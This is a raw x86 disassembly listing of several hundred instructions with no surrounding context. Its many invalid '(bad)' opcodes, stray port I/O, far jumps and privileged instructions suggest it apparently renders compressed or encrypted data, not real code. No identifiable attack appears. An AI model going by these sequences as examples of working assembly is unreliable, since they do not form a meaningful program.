  4037b6:	pop    ds
  4037b7:	adc    eax,0x751b5e85
  4037bc:	sbb    al,0xbf
  4037be:	fild   QWORD PTR [edx+0x2d0dcb97]
  4037c4:	fdivr  st,st(0)
  4037c6:	pop    ebx
  4037c7:	adc    eax,0x311b2233
  4037cc:	fadd   QWORD PTR [edi+0x63]
  4037cf:	and    dl,cl
  4037d1:	int3   
  4037d2:	in     eax,0xed
  4037d4:	dec    BYTE PTR [eax+0x71]
  4037d7:	push   esi
  4037d8:	adc    DWORD PTR [ecx],ecx
  4037da:	aad    0x2a
  4037dc:	xor    bx,WORD PTR [ebp+0x4b]
  4037e0:	fdiv   DWORD PTR [edi+0x402ebd87]
  4037e6:	retf   
  4037e7:	mov    ecx,0x25b59d96
  4037ec:	or     DWORD PTR [ebx],0xffffffa6
  4037ef:	add    BYTE PTR [edx],ah
  4037f1:	mov    bh,BYTE PTR [edi-0x79e8efe9]
  4037f7:	and    DWORD PTR [ecx],esi
  4037f9:	ds pushf 
  4037fb:	sub    BYTE PTR [edi+0x44],cl
  4037fe:	test   eax,0x9ae85fdb
  403803:	add    DWORD PTR gs:[eax-0x43],ebx
  403807:	or     eax,0x479a713
  40380c:	lahf   
  40380d:	ja     0x40384c
  40380f:	enter  0xc6e9,0x8
  403813:	popf   
  403814:	into   
  403815:	xchg   esi,eax
  403816:	or     al,0x9e
  403818:	jo     0x403832
  40381a:	pop    edi
  40381b:	push   edx
  40381c:	outs   dx,DWORD PTR ds:[esi]
  40381d:	sbb    al,0x52
  40381f:	or     DWORD PTR [eax+0x48b96d86],0x55bd406a
  403829:	adc    eax,0x650fbc05
  40382e:	test   al,0xfa
  403830:	jmp    0xc5e7:0xc85a7349
  403837:	push   cs
  403838:	pop    ecx
  403839:	or     esp,ecx
  40383b:	jmp    0xefd639a4
  403840:	cmp    DWORD PTR [ebx],0xffffffb4
  403843:	inc    ebp
  403844:	ins    BYTE PTR es:[edi],dx
  403845:	pusha  
  403846:	(bad)  
  403847:	mov    al,BYTE PTR [edi+ebp*2-0x58]
  40384b:	dec    esp
  40384c:	in     al,0x4d
  40384e:	xor    DWORD PTR [eax+0x117f888b],edx
  403854:	ss out dx,eax
  403856:	cwde   
  403857:	mov    ds:0xe6d222b7,al
  40385c:	mov    bh,0xad
  40385e:	dec    ecx
  40385f:	cmc    
  403860:	and    eax,0x551478f9
  403865:	push   esi
  403866:	or     DWORD PTR [esi],eax
  403868:	fwait
  403869:	loop   0x4038dc
  40386b:	mov    bh,BYTE PTR [eax]
  40386d:	das    
  40386e:	sbb    esp,DWORD PTR ds:0x40d49b12
  403874:	jnp    0x4038d8
  403876:	push   cs
  403877:	test   eax,0xfee4a20d
  40387c:	outs   dx,DWORD PTR ds:[esi]
  40387d:	jbe    0x40389f
  40387f:	jno    0x403802
  403881:	lock adc eax,0x75af2d9e
  403887:	mov    ch,0x8b
  403889:	in     al,dx
  40388a:	sub    al,0x4
  40388c:	push   eax
  40388d:	xchg   BYTE PTR [esi-0x8],bl
  403890:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  403892:	scas   eax,DWORD PTR es:[edi]
  403893:	xchg   ecx,eax
  403894:	and    DWORD PTR [esi+0x3e],0x18fb56cf
  40389b:	push   cs
  40389c:	pop    ebx
  40389d:	pop    ds
  40389e:	xor    DWORD PTR [edx-0x62211b9f],edx
  4038a4:	out    0xce,al
  4038a6:	fwait
  4038a7:	mov    eax,0x1326d3a9
  4038ac:	in     al,0x1a
  4038ae:	fsubr  st(3),st
  4038b0:	cmp    DWORD PTR [eax],0x4145f956
  4038b6:	fistp  QWORD PTR [edx+0x53]
  4038b9:	push   si
  4038bb:	and    cl,BYTE PTR [edx+esi*8+0x60eaa202]
  4038c2:	push   ecx
  4038c3:	jbe    0x403866
  4038c5:	sub    BYTE PTR [ebx+eiz*8+0x1edce0c0],dl
  4038cc:	xor    bh,BYTE PTR [esi]
  4038ce:	mov    ch,0x59
  4038d0:	stos   DWORD PTR es:[edi],eax
  4038d1:	jl     0x4038cb
  4038d3:	test   eax,0x89a914e8
  4038d8:	mov    ch,BYTE PTR [edx-0x51]
  4038db:	(bad)  
  4038dc:	and    esp,ecx
  4038de:	cwde   
  4038df:	out    dx,al
  4038e0:	retf   
  4038e1:	or     eax,0xf4110dd3
  4038e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4038e7:	jecxz  0x4038e3
  4038e9:	pop    ebx
  4038ea:	loope  0x403950
  4038ec:	jns    0x40387a
  4038ee:	imul   ecx,ecx,0xfffffffe
  4038f1:	lds    edi,FWORD PTR [esi]
  4038f3:	xor    bh,BYTE PTR [esi+0xc180763]
  4038f9:	out    dx,al
  4038fa:	mov    ch,0xe1
  4038fc:	jl     0x403909
  4038fe:	fadd   DWORD PTR [edi+0x54]
  403901:	jmp    0x5a0b:0x9f635027
  403908:	fbld   TBYTE PTR [eax-0xf971e8e]
  40390e:	pop    ebx
  403910:	popf   
  403911:	cli    
  403912:	mov    edi,0x822ced7b
  403917:	out    dx,al
  403918:	repz pusha 
  40391a:	jmp    0xe248:0x1077e45a
  403921:	add    al,bh
  403923:	fldcw  WORD PTR [edi+0x7d776805]
  403929:	inc    ecx
  40392a:	pop    ds
  40392b:	dec    ebp
  40392c:	and    DWORD PTR [eax-0x659a9c2d],ebp
  403932:	mov    WORD PTR [edx+ebp*1-0x3eaee60c],es
  403939:	mov    BYTE PTR [ebx+0x32],0x64
  40393d:	div    bl
  40393f:	and    BYTE PTR [di-0x62],0x19
  403944:	enter  0x70bc,0x25
  403948:	hlt    
  403949:	xor    DWORD PTR [eax+0x12],edx
  40394c:	xchg   edi,eax
  40394d:	pop    edx
  40394e:	inc    ecx
  40394f:	jmp    0xd19efbbb
  403954:	(bad)  
  403955:	in     al,dx
  403956:	nop
  403957:	cmp    edi,DWORD PTR [ecx]
  403959:	mov    ebp,0xe189df4d
  40395e:	xchg   ebp,eax
  40395f:	pop    ebp
  403960:	push   cs
  403961:	jmp    0xc03:0x6b640d27
  403968:	ret    0x45d7
  40396b:	pop    eax
  40396c:	(bad)  
  40396d:	pop    esp
  40396e:	sbb    BYTE PTR [ebx-0x1bc9e9bd],dh
  403974:	lods   eax,DWORD PTR gs:[esi]
  403976:	loopne 0x40391d
  403978:	cli    
  403979:	cmovs  ebp,DWORD PTR [edi+0x421e45c4]
  403980:	and    al,0xec
  403982:	outs   dx,DWORD PTR ds:[esi]
  403983:	addr16 call 0x18e108b6
  403989:	pop    ebx
  40398a:	sub    edi,DWORD PTR [ebx+0x28]
  40398d:	repz cld 
  40398f:	pop    esp
  403990:	inc    ebx
  403991:	push   es
  403992:	iret   
  403993:	cmc    
  403994:	sub    eax,0x4cd86f99
  403999:	jmp    0x2a99:0x9d503e57
  4039a0:	in     al,0x1a
  4039a2:	dec    eax
  4039a3:	mov    cl,0xee
  4039a5:	test   BYTE PTR [ebx+0x1e],dh
  4039a8:	pop    esi
  4039a9:	enter  0x8c4c,0x20
  4039ad:	int    0x8
  4039af:	xor    eax,0xa6a4462f
  4039b4:	and    esi,0xffffffb7
  4039b7:	enter  0x118d,0xbc
  4039bb:	mov    al,ds:0x86b1ea37
  4039c0:	cld    
  4039c1:	nop
  4039c2:	pop    ebp
  4039c3:	push   0xf08d25b0
  4039c8:	xor    BYTE PTR [ebp+0x61ac149e],al
  4039ce:	pop    esp
  4039cf:	sbb    ebp,DWORD PTR [ebx+eax*8-0x51]
  4039d3:	jmp    0xd979:0x70ab3423
  4039da:	in     eax,0x4b
  4039dc:	shl    BYTE PTR [ecx+0x53ae51e8],0x12
  4039e3:	mov    dh,0x97
  4039e5:	pop    ss
  4039e6:	fs push eax
  4039e8:	inc    ebx
  4039e9:	adc    al,0x78
  4039eb:	push   ecx
  4039ec:	nop
  4039ed:	add    edx,DWORD PTR [eax+0x67d72de9]
  4039f3:	xor    ch,dh
  4039f5:	mov    bl,BYTE PTR [eax+0x53]
  4039f8:	imul   edx,DWORD PTR [ecx-0x50],0xcd9882b0
  4039ff:	push   0xffffffd2
  403a01:	les    ecx,FWORD PTR [esp+eax*4]
  403a04:	dec    esi
  403a05:	js     0x403997
  403a07:	and    DWORD PTR [edi],ebp
  403a09:	jnp    0x40398b
  403a0b:	dec    ecx
  403a0c:	cmp    BYTE PTR [edx+0xe],al
  403a0f:	(bad)  
  403a10:	jecxz  0x4039af
  403a12:	cmp    al,0xd8
  403a14:	sahf   
  403a15:	cli    
  403a16:	loope  0x403a6a
  403a18:	nop
  403a19:	sti    
  403a1a:	xor    DWORD PTR [edx-0x4f8e0144],0x3
  403a21:	neg    BYTE PTR [bx+si]
  403a24:	sub    ah,BYTE PTR [ecx]
  403a26:	out    dx,al
  403a27:	cmp    eax,DWORD PTR [ebp-0x72f7c85e]
  403a2d:	push   esi
  403a2e:	mov    esi,0x1f316505
  403a33:	or     esi,esi
  403a35:	mov    DWORD PTR [edi+ebp*4],eax
  403a38:	sbb    BYTE PTR [edi],0x8e
  403a3b:	lds    ebp,FWORD PTR ds:0xe659747c
  403a41:	fistp  WORD PTR [ebx]
  403a43:	push   ebx
  403a44:	cli    
  403a45:	repz enter 0xda37,0xff
  403a4a:	repnz in al,dx
  403a4c:	push   ebx
  403a4d:	pop    ss
  403a4e:	pop    fs
  403a50:	pop    edx
  403a51:	in     eax,0xb0
  403a53:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403a54:	push   ecx
  403a55:	add    ecx,DWORD PTR [edi+0x57]
  403a58:	loop   0x4039f1
  403a5a:	jb     0x403a96
  403a5c:	adc    DWORD PTR [edi],ebx
  403a5e:	push   esi
  403a5f:	ret    0x60d
  403a62:	pop    edi
  403a63:	out    0x5a,al
  403a65:	fsubr  QWORD PTR ds:0xc1f028a1
  403a6b:	sar    DWORD PTR [edx+0x306e2f9],0x4b
  403a72:	push   eax
  403a73:	push   0x32
  403a75:	xor    al,BYTE PTR ds:0xb777265c
  403a7b:	and    DWORD PTR [eax],ebp
  403a7d:	sub    eax,0x7cde262d
  403a82:	and    ah,BYTE PTR [eax+0x1ea67814]
  403a88:	and    DWORD PTR [esi+0x20],esp
  403a8b:	sub    eax,0x78467eca
  403a90:	mov    ds,WORD PTR [eax+0x35c9b519]
  403a96:	mov    ecx,0x4251d0
  403a9b:	jmp    0x403a72
  403a9d:	fsubr  st,st(5)
  403a9f:	sub    al,BYTE PTR [ecx-0x74ceea9a]
  403aa5:	call   0x20ec:0x7d63041b
  403aac:	pushf  
  403aad:	arpl   di,bp
  403aaf:	lods   al,BYTE PTR ds:[esi]
  403ab0:	std    
  403ab1:	fist   WORD PTR [esi+0xc]
  403ab4:	arpl   WORD PTR [esi-0x1b],si
  403ab7:	mov    BYTE PTR [esi+0x75],cl
  403aba:	inc    esi
  403abb:	stc    
  403abc:	aad    0xaa
  403abe:	(bad)  
  403abf:	sub    DWORD PTR [edx+0x63],esp
  403ac2:	ret    0xeb15
  403ac5:	xchg   esi,eax
  403ac6:	fisub  DWORD PTR [ebx+0x7a50c652]
  403acc:	and    esp,DWORD PTR [edx+ecx*4-0x2df3233f]
  403ad3:	pop    es
  403ad4:	sbb    bh,BYTE PTR [ebp-0x43ef2032]
  403ada:	push   edi
  403adb:	pop    edx
  403adc:	rol    BYTE PTR [esi-0x7f17c845],0xdb
  403ae3:	and    BYTE PTR [ebx+0x7d6c7782],ch
  403ae9:	ret    0x9e19
  403aec:	(bad)  
  403aed:	sti    
  403aee:	(bad)  
  403aef:	push   ecx
  403af0:	inc    ebx
  403af1:	push   0xae9854ee
  403af6:	loop   0x403ab8
  403af8:	adc    esp,DWORD PTR [ebp-0x58df7bed]
  403afe:	xchg   ebp,eax
  403aff:	cwde   
  403b00:	and    edx,DWORD PTR [esi-0x7deb0ff6]
  403b06:	push   ebp
  403b07:	fwait
  403b08:	and    eax,0xed39c106
  403b0d:	(bad)  
  403b0e:	sub    ebp,DWORD PTR [eax+esi*2+0x65]
  403b12:	cmp    al,0x63
  403b14:	shl    BYTE PTR [edx],1
  403b16:	jmp    0xf1725f27
  403b1b:	xchg   ecx,eax
  403b1c:	xlat   BYTE PTR ds:[ebx]
  403b1d:	xor    eax,0xa663604
  403b22:	das    
  403b23:	loope  0x403b6b
  403b25:	add    ch,0xf8
  403b28:	int    0xf4
  403b2a:	xor    BYTE PTR [esi+0x3608c25e],ah
  403b30:	pop    edx
  403b31:	pop    ebx
  403b32:	inc    edx
  403b33:	arpl   WORD PTR [eax+0x63],ax
  403b36:	dec    ebx
  403b37:	cmp    esi,ebp
  403b39:	jecxz  0x403b1a
  403b3b:	pop    ds
  403b3c:	cmp    eax,0x50efb75a
  403b41:	pop    ebx
  403b42:	std    
  403b43:	cwde   
  403b44:	inc    ecx
  403b45:	scas   eax,DWORD PTR es:[edi]
  403b46:	push   0xffffffd4
  403b48:	cdq    
  403b49:	pop    ecx
  403b4a:	mov    bh,BYTE PTR [esi]
  403b4c:	add    BYTE PTR [edi+eiz*8-0x69edf823],bh
  403b53:	sub    DWORD PTR [ecx+0x1714fcc],0x20
  403b5a:	in     eax,0xb4
  403b5c:	pop    es
  403b5d:	or     eax,DWORD PTR [ecx+0x4fa32b21]
  403b63:	mov    al,0xa3
  403b65:	sub    eax,0xa414277a
  403b6a:	fcomp  DWORD PTR [ebp+0x4dda173c]
  403b70:	mov    esp,0x588f5170
  403b75:	cmp    ebx,ebp
  403b77:	fimul  DWORD PTR [ebx+0x9c68f43]
  403b7d:	pop    esp
  403b7e:	or     BYTE PTR [eax+eax*2],ch
  403b81:	cmp    eax,0xbc9efaff
  403b86:	push   es
  403b87:	repnz pop ss
  403b89:	xchg   esi,eax
  403b8a:	sub    ah,BYTE PTR [eax]
  403b8c:	jmp    0x403c06
  403b8e:	xor    al,BYTE PTR [ebx+0x7270066d]
  403b94:	sbb    cl,BYTE PTR [edi-0x710c6c25]
  403b9a:	inc    ebx
  403b9b:	nop
  403b9c:	jb     0x403b9c
  403b9e:	(bad)  
  403b9f:	arpl   WORD PTR [ecx],bx
  403ba1:	jmp    0x2e449853
  403ba6:	repz jno 0x403b71
  403ba9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403baa:	add    dh,dl
  403bac:	push   ebx
  403bad:	inc    esp
  403bae:	lods   eax,DWORD PTR ds:[esi]
  403baf:	jle    0x403be1
  403bb1:	scas   eax,DWORD PTR es:[edi]
  403bb2:	xchg   edx,eax
  403bb3:	jne    0x403b45
  403bb5:	push   edi
  403bb6:	and    BYTE PTR [eax-0x1cf87725],ch
  403bbc:	sub    dl,BYTE PTR [edi-0x44]
  403bbf:	mov    ah,0xce
  403bc1:	cdq    
  403bc2:	dec    ecx
  403bc3:	jnp    0x403b9b
  403bc5:	push   edi
  403bc6:	aaa    
  403bc7:	mov    esp,edi
  403bc9:	dec    edi
  403bca:	fwait
  403bcb:	enter  0xbf49,0xa7
  403bcf:	fisubr WORD PTR [ebx+0x32]
  403bd2:	les    ebx,FWORD PTR [edx+0x2fe9c73e]
  403bd8:	test   BYTE PTR [ebp+0x19fb4f84],dl
  403bde:	dec    ebp
  403bdf:	or     bl,BYTE PTR [ecx+0x4baecd59]
  403be5:	xor    ah,BYTE PTR [esp+ebp*1+0x9004f1b]
  403bec:	popf   
  403bed:	es enter 0xec57,0x1a
  403bf2:	pushf  
  403bf3:	jns    0x403bf9
  403bf5:	and    cl,BYTE PTR [esi]
  403bf7:	lock push 0xffffff86
  403bfa:	cmp    BYTE PTR [ecx],ah
  403bfc:	nop
  403bfd:	mov    ebp,0xd34dd0a5
  403c02:	lock adc esp,DWORD PTR [eax+0x6c7aff4e]
  403c09:	in     al,dx
  403c0a:	push   cs
  403c0b:	push   edi
  403c0c:	lods   eax,DWORD PTR ds:[esi]
  403c0d:	sub    dh,BYTE PTR [edi-0x4a]
  403c10:	cmp    ah,BYTE PTR [eax]
  403c12:	ror    dh,1
  403c14:	fcmovb st,st(6)
  403c16:	jo     0x403bfe
  403c18:	cli    
  403c19:	inc    edi
  403c1a:	pop    eax
  403c1b:	pop    ebp
  403c1c:	cld    
  403c1d:	dec    edx
  403c1e:	sbb    BYTE PTR [esp+edx*8+0x3b60307],dh
  403c25:	add    ebp,DWORD PTR [ebx]
  403c27:	mov    dl,0x8a
  403c29:	shl    DWORD PTR [ebp-0x76],cl
  403c2c:	inc    esp
  403c2d:	jbe    0x403c61
  403c2f:	pop    ds
  403c30:	jmp    0x6874:0x57b64441
  403c37:	retf   
  403c38:	ret    
  403c39:	sbb    eax,0xe6d02f78
  403c3e:	std    
  403c3f:	clc    
  403c40:	pop    esp
  403c41:	and    eax,0x93660983
  403c46:	rcr    BYTE PTR [ecx+0x4f],1
  403c49:	xchg   edi,eax
  403c4a:	mov    al,0x4d
  403c4c:	fcmovb st,st(3)
  403c4e:	in     al,dx
  403c4f:	and    al,0xfd
  403c51:	xor    ah,BYTE PTR [ecx+eax*8+0x37]
  403c55:	mov    cl,0x7a
  403c57:	call   0xa57d:0x2ffc509d
  403c5e:	mov    ah,0x5a
  403c60:	(bad)  
  403c61:	jmp    0xcd0c:0x9250b6b1
  403c68:	into   
  403c69:	cmp    dh,al
  403c6b:	cmp    al,BYTE PTR [edx-0x17]
  403c6e:	push   cs
  403c6f:	(bad)  
  403c70:	lea    edx,[esi+edx*4-0xa]
  403c74:	bound  ecx,QWORD PTR [ebx+0x2ee39149]
  403c7a:	mov    esp,0x94737419
  403c7f:	mov    cl,0x6b
  403c81:	sub    esp,eax
  403c83:	push   eax
  403c84:	arpl   WORD PTR [ebp+0x5de81111],sp
  403c8a:	inc    esi
  403c8b:	cmc    
  403c8c:	std    
  403c8d:	pop    esp
  403c8e:	stos   DWORD PTR es:[edi],eax
  403c8f:	rcr    ah,1
  403c91:	ins    BYTE PTR es:[edi],dx
  403c92:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403c93:	stos   DWORD PTR es:[edi],eax
  403c94:	(bad)
  403c98:	pop    ds
  403c99:	mov    esi,0x8d0c0109
  403c9e:	mov    bh,0x5
  403ca0:	ficom  DWORD PTR [ebp-0x5c]
  403ca3:	fucomip st,st(5)
  403ca5:	adc    DWORD PTR [ebx+0x73],esp
  403ca8:	loopne 0x403c75
  403caa:	dec    eax
  403cab:	or     ch,BYTE PTR [edx+0x9]
  403cae:	mov    edx,0x3181dc8b
  403cb3:	sub    BYTE PTR [edx],al
  403cb5:	cmp    ebp,DWORD PTR [ecx+0x6e7dbcd4]
  403cbb:	into   
  403cbc:	call   FWORD PTR [edx-0x26]
  403cbf:	les    ebx,FWORD PTR [ecx]
  403cc1:	mov    ?,WORD PTR [ebx+0x34]
  403cc4:	push   0x842799cf
  403cc9:	cmp    ch,BYTE PTR [edx+0x4b419195]
  403ccf:	(bad)  
  403cd0:	push   ebx
  403cd1:	bound  esi,QWORD PTR [edi]
  403cd3:	sbb    eax,DWORD PTR [edx+0x1ce8eeaf]
  403cd9:	in     eax,dx
  403cda:	jns    0x403cce
  403cdc:	jbe    0x403cc0
  403cde:	outs   dx,BYTE PTR ds:[esi]
  403cdf:	inc    ebx
  403ce0:	or     dh,BYTE PTR [edi]
  403ce2:	data16 arpl WORD PTR [esi+0x26719642],di
  403ce9:	pusha  
  403cea:	cdq    
  403ceb:	mov    dh,0x84
  403ced:	add    eax,0xb5bc39a4
  403cf2:	or     edx,DWORD PTR [eax]
  403cf4:	fbstp  TBYTE PTR [ebp-0x2eff4568]
  403cfa:	(bad)  
  403cfb:	outs   dx,BYTE PTR ds:[esi]
  403cfc:	pop    eax
  403cfd:	fdivr  st,st(0)
  403cff:	mov    ch,0x9e
  403d01:	test   dl,dl
  403d03:	jp     0x403c95
  403d05:	das    
  403d06:	cmp    cl,BYTE PTR ds:0x3df20290
  403d0c:	jae    0x403cb2
  403d0e:	call   0xe23700cb
  403d13:	mov    edi,0x622ca920
  403d18:	mov    dh,BYTE PTR [edi]
  403d1a:	lahf   
  403d1b:	and    BYTE PTR [ebx+eiz*4],bh
  403d1e:	adc    BYTE PTR [ecx-0x355b05da],cl
  403d24:	cmp    eax,0x1b90685c
  403d29:	scas   eax,DWORD PTR es:[edi]
  403d2a:	cmp    eax,0x404c32ff
  403d2f:	add    ch,ah
  403d31:	icebp  
  403d32:	jecxz  0x403cee
  403d34:	jle    0x403d3b
  403d36:	enter  0x833b,0x46
  403d3a:	fwait
  403d3b:	cmp    al,0x49
  403d3d:	and    DWORD PTR [esp+edx*2],eax
  403d40:	loopne 0x403d45
  403d42:	stos   BYTE PTR es:[edi],al
  403d43:	mov    eax,0x95ec659d
  403d48:	mov    ch,0x7c
  403d4a:	jl     0x403dbd
  403d4c:	adc    eax,0xdf0d9f15
  403d51:	push   ss
  403d52:	lahf   
  403d53:	jns    0x403d61
  403d55:	cmp    DWORD PTR [ebp+0x1c],esp
  403d58:	mov    edx,0x74ea5968
  403d5d:	js     0x403db4
  403d5f:	aas    
  403d60:	imul   ebp
  403d62:	test   BYTE PTR [ebx],dl
  403d64:	dec    ebx
  403d65:	icebp  
  403d66:	std    
  403d67:	call   0x597c:0xddf8a50b
  403d6e:	pusha  
  403d6f:	cs xor eax,0x9747c6c0
  403d75:	jb     0x403dce
  403d77:	cmp    al,0x4b
  403d79:	jae    0x403db2
  403d7b:	dec    esi
  403d7c:	call   0x4c75:0xa27c2eea
  403d83:	(bad)  
  403d85:	imul   esi,ebx,0xffffffa4
  403d88:	fidivr DWORD PTR [eax-0x368977d9]
  403d8e:	add    al,0x65
  403d90:	inc    eax
  403d91:	inc    ebx
  403d92:	sahf   
  403d93:	mov    ch,0x13
  403d95:	lahf   
  403d96:	sti    
  403d97:	sbb    edi,edx
  403d99:	lock mov ebx,esi
  403d9c:	lods   al,BYTE PTR ds:[esi]
  403d9d:	mov    al,ds:0x2fd155d2
  403da2:	xchg   edi,eax
  403da3:	repz imul ecx,DWORD PTR [ecx-0x26],0xad0c07d
  403dab:	fistp  DWORD PTR [ebp-0x56]
  403dae:	sbb    BYTE PTR [edx+0x23eb44c2],0x50
  403db5:	sbb    BYTE PTR [edi],ah
  403db7:	jle    0x403da9
  403db9:	pop    edx
  403dba:	les    eax,FWORD PTR [ebx]
  403dbc:	mov    eax,0xa87b744d
  403dc1:	fimul  WORD PTR [eax-0x3ba11ce8]
  403dc7:	std    
  403dc8:	(bad)  
  403dc9:	in     al,0x2c
  403dcb:	xchg   ebx,eax
  403dcc:	pause  
  403dce:	jecxz  0x403dfb
  403dd0:	adc    BYTE PTR [esi+eax*2+0x22],bh
  403dd4:	xor    eax,0x488d844a
  403dd9:	fcomp  QWORD PTR [edi+0x76]
  403ddc:	clc    
  403ddd:	fist   WORD PTR [esi+edx*1+0x70]
  403de1:	mov    ds:0xa06281e3,al
  403de6:	jb     0x403e5e
  403de8:	cmp    edx,0x7d
  403deb:	adc    esi,DWORD PTR [ebx+0x5b914a59]
  403df1:	out    dx,eax
  403df2:	ja     0x403d9f
  403df4:	arpl   WORD PTR [eax+0x1f],ax
  403df7:	test   BYTE PTR [ecx-0x1b],0x6e
  403dfb:	sbb    eax,0x8b7f211
  403e00:	in     eax,dx
  403e01:	mov    eax,DWORD PTR [eax+0xa257259]
  403e07:	mov    eax,ds:0x5ccb3622
  403e0c:	ficom  WORD PTR [ecx]
  403e0e:	rcr    BYTE PTR [esi+0x2d],cl
  403e11:	stos   DWORD PTR es:[edi],eax
  403e12:	sub    al,0x9f
  403e14:	adc    eax,0xdff58b77
  403e19:	retf   
  403e1a:	and    eax,0x5a325a58
  403e1f:	repnz xchg ebx,eax
  403e21:	das    
  403e22:	mov    bh,0x65
  403e24:	cdq    
  403e25:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403e26:	cmovo  edx,DWORD PTR [esi-0x68142ee2]
  403e2d:	add    eax,0x94479342
  403e32:	test   eax,0x6a342bff
  403e37:	call   0xbe4736d2
  403e3c:	dec    edx
  403e3d:	(bad)
  403e41:	xchg   DWORD PTR [esi-0x766a87ed],eax
  403e47:	jns    0x403e40
  403e49:	cdq    
  403e4a:	mov    edx,0x2da5578d
  403e4f:	cmp    BYTE PTR [edx-0x795e512d],dl
  403e55:	dec    edi
  403e56:	or     ecx,DWORD PTR [ebx-0x23]
  403e59:	scas   eax,DWORD PTR es:[edi]
  403e5a:	stc    
  403e5b:	les    esp,FWORD PTR [eax+0x126a58c0]
  403e61:	int3   
  403e62:	(bad)
  403e65:	and    ah,BYTE PTR [eax+0x4a]
  403e68:	cli    
  403e69:	mov    DWORD PTR ds:0xa6f32edd,ebp
  403e6f:	dec    edx
  403e70:	test   al,0xef
  403e72:	inc    ebx
  403e73:	js     0x403e54
  403e75:	cmp    BYTE PTR [eax-0x4629e038],cl
  403e7b:	sub    dl,BYTE PTR [ebx]
  403e7d:	hlt    
  403e7e:	sbb    cl,BYTE PTR [ecx+0x7adf3393]
  403e84:	or     dl,BYTE PTR [esi+0x6efe29a]
  403e8a:	xor    al,0xbc
  403e8c:	in     eax,0x64
  403e8e:	(bad)  
  403e90:	in     al,dx
  403e91:	mov    dl,BYTE PTR [ebx]
  403e93:	(bad)  
  403e94:	mov    esp,0x231fa3f7
  403e99:	add    BYTE PTR [ebp+0x3e273a43],bh
  403e9f:	mov    edx,0xc162ac85
  403ea4:	inc    ebx
  403ea5:	xchg   edx,eax
  403ea6:	mov    al,0x9a
  403ea8:	inc    edi
  403ea9:	or     al,0x29
  403eab:	or     esp,esi
  403ead:	int3   
  403eae:	fild   QWORD PTR [edx-0x11]
  403eb1:	int3   
  403eb2:	mov    ebp,0x2b7e5117
  403eb7:	aad    0xa0
  403eb9:	mov    edi,0xe0cfec6f
  403ebe:	fld    TBYTE PTR [ecx+ecx*8-0x2fb30a35]
  403ec5:	push   cs
  403ec6:	lock lds edx,FWORD PTR [eax+ebp*8]
  403eca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403ecb:	xor    eax,DWORD PTR [ecx]
  403ecd:	in     eax,0x9
  403ecf:	cmp    ebp,DWORD PTR [eax+0x33b444a9]
  403ed5:	push   esi
  403ed6:	test   DWORD PTR [edx-0x942613d],esp
  403edc:	lods   al,BYTE PTR ds:[esi]
  403edd:	cdq    
  403ede:	mov    al,ds:0xa06c04db
  403ee3:	jmp    0x403ec2
  403ee5:	xchg   esi,eax
  403ee6:	xchg   ebp,eax
  403ee7:	aas    
  403ee8:	jge    0x403e95
  403eea:	in     al,0x23
  403eec:	inc    ecx
  403eed:	xor    eax,0x8ac9bf92
  403ef2:	fstp   st(5)
  403ef4:	retf   
  403ef5:	cmp    al,0xd
  403ef7:	scas   al,BYTE PTR es:[edi]
  403ef8:	mov    eax,ds:0x747c8cbb
  403efd:	push   esi
  403efe:	out    0x51,eax
  403f00:	lods   al,BYTE PTR ds:[esi]
  403f01:	mov    esp,0x4c9954a7
  403f06:	cmp    al,0x2a
  403f08:	mov    edx,0x5b0689fb
  403f0d:	test   eax,0x6bbeeaa9
  403f12:	mov    dh,0x55
  403f14:	pop    ds
  403f15:	vmwrite esi,DWORD PTR [edi+0x395fd090]
  403f1c:	add    al,0xa4
  403f1e:	(bad)
  403f21:	lea    ecx,[ebp+0x79]
  403f24:	jmp    DWORD PTR [esp+edx*1+0x9ecd617]
  403f2b:	cmp    esi,edx
  403f2d:	in     al,0x3f
  403f2f:	fld    st(4)
  403f31:	imul   edi,DWORD PTR [esi],0x9f7724ff
  403f37:	sub    dl,BYTE PTR [ebx]
  403f39:	arpl   WORD PTR [ebx+ebx*2+0x5],sp
  403f3d:	jne    0x403fa8
  403f3f:	ins    DWORD PTR es:[edi],dx
  403f40:	bound  edx,QWORD PTR [ebx+0x7af49b95]
  403f46:	ins    BYTE PTR es:[edi],dx
  403f47:	xor    DWORD PTR es:[esi],ecx
  403f4a:	lea    edi,[ebx]
  403f4c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403f4d:	xchg   BYTE PTR [esi],bh
  403f4f:	and    al,0x3d
  403f51:	add    edx,0x28
  403f54:	lock outs dx,BYTE PTR ds:[esi]
  403f56:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403f57:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403f58:	daa    
  403f59:	out    0x35,al
  403f5b:	xchg   ebx,eax
  403f5c:	pusha  
  403f5d:	pop    ecx
  403f5e:	nop    DWORD PTR [eax+0x37]
  403f62:	lods   eax,DWORD PTR ds:[esi]
  403f63:	arpl   WORD PTR [ebp-0x19fa7df2],bp
  403f69:	inc    edx
  403f6a:	sub    bh,BYTE PTR [edx]
  403f6c:	cmp    cl,dl
  403f6e:	jl     0x403fb5
  403f70:	ja     0x403fc2
  403f72:	mov    bh,BYTE PTR [ebp-0x39f89bbd]
  403f78:	and    eax,0x7f30d3d1
  403f7d:	mov    al,ds:0xafa69977
  403f82:	jns    0x403fd3
  403f84:	lea    esi,[esp+edi*8]
  403f87:	sbb    DWORD PTR [ebx],edi
  403f89:	hlt    
  403f8a:	das    
  403f8b:	outs   dx,DWORD PTR ds:[esi]
  403f8c:	pusha  
  403f8d:	inc    ebx
  403f8e:	mov    dh,0x76
  403f90:	push   edi
  403f91:	imul   ecx,DWORD PTR [esi],0xffffffa8
  403f94:	stc    
  403f95:	ins    BYTE PTR es:[edi],dx
  403f96:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403f97:	cmp    edx,DWORD PTR [ebx*1+0x52689664]
  403f9e:	mov    eax,0x3d91f9dd
  403fa3:	out    dx,eax
  403fa4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403fa5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403fa6:	js     0x403f8a
  403fa8:	jb     0x403f64
  403faa:	dec    esi
